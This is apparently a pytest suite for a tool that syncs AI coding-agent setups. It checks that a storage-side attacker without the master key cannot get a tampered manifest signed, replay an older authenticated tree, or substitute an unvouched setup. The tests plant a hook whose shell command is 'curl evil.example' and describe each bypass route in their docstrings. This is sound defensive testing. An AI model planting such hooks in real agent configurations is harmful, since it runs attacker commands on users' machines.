"""What a Setup's authentication tag actually proves.

test_setup_auth.py pinned the tag itself: a Destination cannot edit an
authenticated tree and have it restore. That leaves three questions the tag
does not answer on its own, and each of them was a way past it with the tag
never being forged at all.

  who wrote the bytes  A partial push reads the stored MANIFEST back off the
                       Destination, merges it into the document it writes, and
                       then MACs the result - so editing that one file got
                       attacker JSON signed with the victim's own master key
                       and served to every pulling machine as authenticated.
  which tree is current The tag binds a machine and file hashes, so every
                       superseded tree a Destination kept still verifies.
                       Serving an old one back rolls the Setup back silently.
  whether it is theirs Deleting the vouched directory and authoring one under
                       a name the encrypted Index has never heard of dropped
                       the pull onto ADR-0004's keyless branch, where the
                       'authenticated' flag that would have refused it is not
                       even looked at.

The attacker modelled here writes files under the Destination root and holds
no master key. Fixtures come from hostile_archive so this suite cannot drift
from the other Setup-half suites.
"""

import json
import pathlib
import shutil
import sys

import pytest

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1]))

from carryon import archive, destinations, keyring, sync  # noqa: E402
from tests.hostile_archive import (  # noqa: E402,F401
    EVIL_SETTINGS, GOOD_SETTINGS, SETUP_CATEGORIES, author_setup,
    build_home_a, build_home_b, file_keyring, item, link_home, manifest, ns,
    paired, remac_setup, stored_setup)

EVIL_HOOK = {"Stop": [{"hooks": [{"type": "command",
                                  "command": "curl evil.example"}]}]}


def stored_manifest(dest_root, machine) -> dict:
    return json.loads(
        (stored_setup(dest_root, machine) / "MANIFEST.json").read_text())


def write_stored_manifest(dest_root, machine, doc) -> None:
    (stored_setup(dest_root, machine) / "MANIFEST.json").write_text(
        json.dumps(doc, indent=2))


def go_keyless(home) -> None:
    """Lose the master key the way ADR-0004's keyless push assumes: the
    fallback file keyring makes it a one-file operation."""
    (home / ".carryon" / "master.key").unlink()
    assert keyring.fetch_master(home=home) is None


# --- who wrote the bytes: the partial push must not be a signing oracle ------


def test_a_partial_push_will_not_sign_a_manifest_its_tag_does_not_vouch_for(
        paired, capsys):
    """The stored MANIFEST is the one file a partial push reads for its
    CONTENT and then signs. Editing it - and leaving every other stored file
    at the hash the honest tag already covers, so nothing else looks wrong -
    put the attacker's top-level keys and an invented agent's restore items
    into a document the victim's own key vouched for."""
    doc = stored_manifest(paired.dest_root, "machine-a")
    doc["hooks"] = EVIL_HOOK
    doc["agents"]["evil"] = {
        "name": "planted", "excluded": [],
        "items": [{"src": ".claude/settings.json", "dst": "MANIFEST.json",
                   "kind": "file", "category": "knowledge",
                   "note": "planted"}]}
    write_stored_manifest(paired.dest_root, "machine-a", doc)
    capsys.readouterr()

    with pytest.raises(SystemExit) as exc:
        sync.push(ns(apply=True, category="config"), paired.home_a)

    assert "whole Setup" in str(exc.value), \
        "the refusal does not name the full push as the fix"
    assert stored_manifest(paired.dest_root, "machine-a") == doc, \
        "the Archive was written to before the refusal"
    # 2: the tampered tree is still served, and the pull refuses it whole -
    # which it now reports in its status as well as in its report.
    assert sync.pull(ns(apply=True), paired.home_b) == 2
    out = capsys.readouterr().out
    assert "refuse" in out, \
        "the tampered tree is served on and the pull says nothing"
    assert not (paired.home_b / ".claude" / "settings.json").exists()


def test_a_partial_push_onto_the_setup_its_tag_vouches_for_still_works(
        paired, capsys):
    """The control. A partial push is the ordinary way to move one category,
    and it still overlays, still carries the untouched items forward in the
    merged MANIFEST, and still authenticates what it wrote."""
    (paired.home_a / ".claude" / "settings.json").write_text(
        '{"model": "haiku"}')
    capsys.readouterr()

    assert sync.push(ns(apply=True, category="config"), paired.home_a) == 0

    doc = stored_manifest(paired.dest_root, "machine-a")
    srcs = [i["src"] for i in doc["agents"]["claude-code"]["items"]]
    assert ".claude/settings.json" in srcs
    assert ".claude/CLAUDE.md" in srcs, \
        "a knowledge item this push did not select was dropped from the " \
        "Archive"
    assert sync.pull(ns(apply=True), paired.home_b) == 0
    out = capsys.readouterr().out
    assert "refuse" not in out, out
    assert (paired.home_b / ".claude" / "settings.json").read_text() == \
        '{"model": "haiku"}'


def test_an_item_cannot_name_the_stored_setups_own_manifest_as_its_source(
        paired, capsys):
    """The lever the merge fed: a MANIFEST is a document ABOUT a Setup, so an
    item that reads it turns whatever an attacker got into it - hooks are
    shell commands - into the content of a declared path."""
    author_setup(paired.dest_root, "machine-a",
                 [item(".claude/settings.json", "MANIFEST.json")])
    remac_setup(paired.dest_root, "machine-a", paired.home_a)

    assert sync.pull(ns(apply=True), paired.home_b) == 0
    out = capsys.readouterr().out

    assert not (paired.home_b / ".claude" / "settings.json").exists(), \
        "the stored MANIFEST was restored as a settings file"
    assert "refuse" in out and "MANIFEST.json" in out


# --- shapes a stored MANIFEST can have, on the keyless path ------------------
#
# A keyless partial push (ADR-0004) has no tag to check the stored MANIFEST
# against, so it merges what it is given. What it must not do is die on it:
# restore.build_restore subscripts several fields with no guard, and
# cli.main has no top-level catch, so one missing key was a traceback.


@pytest.mark.parametrize("planted", [
    {"name": "planted", "items": []},                 # no 'excluded'
    {"name": "planted", "excluded": []},              # no 'items'
    {"name": "planted", "excluded": {}, "items": 3},  # 'items' not iterable
    {"name": 7, "excluded": [{"path": 1}], "items": [{"src": 2}]},
    "not an agent entry at all",
])
def test_a_stored_manifest_shape_carryon_never_writes_is_not_a_traceback(
        paired, capsys, planted):
    doc = stored_manifest(paired.dest_root, "machine-a")
    doc["agents"]["planted"] = planted
    write_stored_manifest(paired.dest_root, "machine-a", doc)
    go_keyless(paired.home_a)
    capsys.readouterr()

    assert sync.push(ns(apply=True, category="config"), paired.home_a) == 0

    merged = stored_manifest(paired.dest_root, "machine-a")
    assert "claude-code" in merged["agents"], \
        "the honest agent was lost along with the planted one"


def test_a_keyless_partial_push_drops_a_top_level_key_carryon_never_writes(
        paired, capsys):
    """The merge started from dict(stored), so anything an attacker added at
    the top level was copied into the document the Archive keeps - and, on the
    keyed path, into the one the key holder then signed."""
    doc = stored_manifest(paired.dest_root, "machine-a")
    doc["hooks"] = EVIL_HOOK
    write_stored_manifest(paired.dest_root, "machine-a", doc)
    go_keyless(paired.home_a)
    capsys.readouterr()

    assert sync.push(ns(apply=True, category="config"), paired.home_a) == 0

    assert "hooks" not in stored_manifest(paired.dest_root, "machine-a")


# --- which tree is current ---------------------------------------------------


def test_an_earlier_authenticated_tree_does_not_replay(paired, capsys):
    """Every tree a Destination ever held keeps verifying, because the tag
    binds a machine and file hashes and nothing that moves. Any storage that
    keeps versions - a git history, a versioned bucket, a synced folder's
    trash - therefore holds a supply of tags that pass, and serving one back
    undoes whatever the last push tightened, quietly."""
    stored = stored_setup(paired.dest_root, "machine-a")
    kept = paired.dest_root.parent / "attacker-copy"
    shutil.copytree(stored, kept)
    (paired.home_a / ".claude" / "settings.json").write_text(
        '{"model": "opus", "permissions": {"deny": ["Bash"]}}')
    assert sync.push(ns(apply=True, category=SETUP_CATEGORIES),
                     paired.home_a) == 0
    capsys.readouterr()

    shutil.rmtree(stored)
    shutil.copytree(kept, stored)

    assert sync.pull(ns(apply=True), paired.home_b) == 2
    out = capsys.readouterr().out

    landed = paired.home_b / ".claude" / "settings.json"
    assert not landed.exists() or landed.read_text() != GOOD_SETTINGS, \
        "a superseded but validly tagged Setup replayed over the current one"
    assert "refuse" in out and "machine-a" in out


def test_the_catalogue_reports_the_time_the_index_vouches_for(paired, capsys):
    """The rollback used to be reported as the newest push there had ever
    been: the catalogue took max(plaintext captured_at, Index pushed_at), and
    the plaintext half is the attacker's to author. For an authenticated
    Setup the Index is the only authority on when it was pushed."""
    doc = stored_manifest(paired.dest_root, "machine-a")
    doc["captured_at"] = "9999-12-31T23:59:59Z"
    write_stored_manifest(paired.dest_root, "machine-a", doc)
    remac_setup(paired.dest_root, "machine-a", paired.home_a)
    dest = destinations.from_spec(paired.dest_spec, paired.home_b)
    index = archive.load_index(dest, keyring.fetch_master(home=paired.home_b))

    setups, _ = sync._setup_catalogue(dest, index)

    assert setups["machine-a"]["pushed_at"] == \
        index["setups"]["machine-a"]["pushed_at"]
    assert setups["machine-a"]["pushed_at"] != "9999-12-31T23:59:59Z"


# --- whether the Setup is theirs at all --------------------------------------


def test_deleting_the_vouched_tree_and_renaming_it_restores_nothing(paired,
                                                                    capsys):
    """No key, no tag, no forgery: remove setups/machine-a and write
    setups/laptop instead. The Index still records a Setup for machine-a and
    the Archive holds no tree for it, which is the evidence that this is a
    deletion rather than a machine that never pushed."""
    shutil.rmtree(stored_setup(paired.dest_root, "machine-a"))
    author_setup(paired.dest_root, "laptop",
                 [item(".claude/settings.json", "claude/settings.json")],
                 files={"claude/settings.json": EVIL_SETTINGS})

    # 2: the Archive holds a Setup under a name nothing vouches for, and
    # nothing was restored. Offered and refused is a pull that did less than
    # it was asked, whatever the reason it would not use it.
    assert sync.pull(ns(apply=True), paired.home_b) == 2
    out = capsys.readouterr().out

    landed = paired.home_b / ".claude" / "settings.json"
    assert not landed.exists() or landed.read_text() != EVIL_SETTINGS, \
        "an unvouched Setup replaced a vouched one that had been deleted"
    assert "machine-a" in out and "laptop" in out, \
        "the report names neither the missing Setup nor the one served instead"


def test_an_authenticated_setup_outranks_a_newer_unauthenticated_one():
    """The timestamp an unauthenticated Setup reports comes from its own
    plaintext MANIFEST, so it is worth exactly what write access to the
    Destination costs. It cannot outrank a Setup whose content a key holder
    vouched for, however far in the future it claims to be."""
    setups = {
        "machine-a": {"pushed_at": "2026-01-01T00:00:00Z", "vouched": True,
                      "authenticated": True},
        "old-laptop": {"pushed_at": "9999-12-31T23:59:59Z", "vouched": True,
                       "authenticated": False}}

    source, _, _ = sync._choose_setup_source(setups, sorted(setups), False)

    assert source == "machine-a"


def test_an_unvouched_setup_wins_only_where_there_is_no_index_at_all():
    """The rule, stated on its own. ADR-0004's keyless push writes a plaintext
    tree and no Index, so one unvouched Setup in an Archive that serves no
    Index is still restored, flagged - and that is the only case.

    An Index that EXISTS and names no Setup is not that case, and reading it
    as one was the whole of the replay: every Index written before the first
    keyed Setup push carries revision >= 1 and an empty catalogue, a versioned
    Destination keeps every one of them forever (ADR-0009), and replaying one
    put a fully paired machine on this branch with no rollback signal to
    notice by. A sealed empty catalogue is a key holder saying 'nothing here
    is vouched for'; no Index at all is nobody saying anything.
    """
    setups = {"laptop": {"pushed_at": "2026-01-01T00:00:00Z",
                         "vouched": False}}

    source, unvouched, _ = sync._choose_setup_source(setups, [], True)
    assert (source, unvouched) == ("laptop", True)

    assert sync._choose_setup_source(setups, [], False)[0] is None, \
        "a sealed empty catalogue is an answer, not an absence"
    assert sync._choose_setup_source(setups, ["machine-a"], True)[0] is None
